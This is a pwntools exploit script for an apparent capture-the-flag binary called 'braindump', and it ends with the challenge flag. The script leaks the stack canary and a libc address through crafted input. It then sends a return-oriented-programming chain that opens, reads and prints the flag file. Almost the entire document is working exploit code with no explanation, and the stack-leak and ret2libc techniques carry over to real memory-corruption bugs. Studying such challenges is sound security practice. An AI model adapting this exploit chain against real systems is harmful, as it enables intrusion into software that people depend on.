#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc.so.6_eea5f41864be6e7b95da2f33f3dec47f')
else:
    DEBUG = True
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

b = ELF('braindump_a4538a4da335e7b2e84d18c3dfe1832e')
context.log_level = 'info'
context.arch = 'amd64'

###

if DEBUG:
    r = process('./braindump_a4538a4da335e7b2e84d18c3dfe1832e')
else:
    r = remote('pwn.ctf.rocks', 31337)

r.recvuntil('code:')

RSI = 0x0000000000400e91 # pop rsi ; pop r15 ; ret
RDI = 0x0000000000400e93 # pop rdi ; ret

ROP  = ''
ROP += p64(0x0000000000400a10) # pop rbp ; ret
ROP += p64(b.bss(0x50) + 0x210)
ROP += p64(0x0000000000400D88) # just before fgets in main

code  = '!>' * 0x1f8 # to get to the bof part
# leaking SSP
for i in xrange(8):
    code += '!:'
    code += '!>'
code += '!>' * 8
# leaking libc
for i in xrange(6):
    code += '!:'
    code += '!>'
code += '!<' * 6
for i in xrange(len(ROP)):
    code += '!.'
    code += '!>'

log.info('payload len: %#x' % len(code))
GDB = False
if GDB and DEBUG:
    gdb.attach(r, 'b *0x0000000000400E2B')

r.sendline(code)

time.sleep(1)
r.send(ROP)

# leak libc
d = r.recv(8)
ssp = u64(d)
log.info('ssp: %#x' % ssp)

d = r.recv(6) + '\x00' * 2
d = u64(d)
libcbase = (d - libc.symbols['__libc_start_main']) & ~0xfff
log.info('leak: %#x' % d)
log.info('libcbase: %#x' % libcbase)

time.sleep(3)
# ROP part
# put /home/flag/ctf into memory (bss(0x50))
code = 'A' * 0x218
code += p64(ssp)
code += p64(0)
code += p64(RDI)
code += p64(0)
code += p64(RSI)
code += p64(b.bss(0x50))
code += 'A' * 8 # bogus
code += p64(libcbase + libc.search(asm('pop rdx\nret')).next()) # rdx
code += p64(len('/home/ctf/flag\x00'))
code += p64(libcbase + libc.symbols['read'])

# open flag
code += p64(RDI)
code += p64(b.bss(0x50))
code += p64(RSI)
code += p64(0)
code += 'A' * 8 # bogus
code += p64(libcbase + libc.search(asm('pop rdx\nret')).next()) # rdx
code += p64(0)
code += p64(libcbase + libc.symbols['open'])

# read flag content
code += p64(RDI)
code += p64(3)
code += p64(RSI)
code += p64(b.bss(0x50))
code += 'A' * 8 # bogus
code += p64(libcbase + libc.search(asm('pop rdx\nret')).next()) # rdx
code += p64(0x50) # flag len
code += p64(libcbase + libc.symbols['read'])

# write part
code += p64(RDI)
code += p64(1)
code += p64(RSI)
code += p64(b.bss(0x50))
code += 'A' * 8 # bogus
code += p64(libcbase + libc.search(asm('pop rdx\nret')).next()) # rdx
code += p64(0x50) # flag len
code += p64(libcbase + libc.symbols['write'])

log.info('second ROP len: %#x' % len(code))
r.sendline(code)

time.sleep(1)
r.send('/home/ctf/flag\x00')

print r.recvall()
r.close()

# SCTF{0uT_oF_BoUNdZ_out_0F_c0ntr0lzZz}
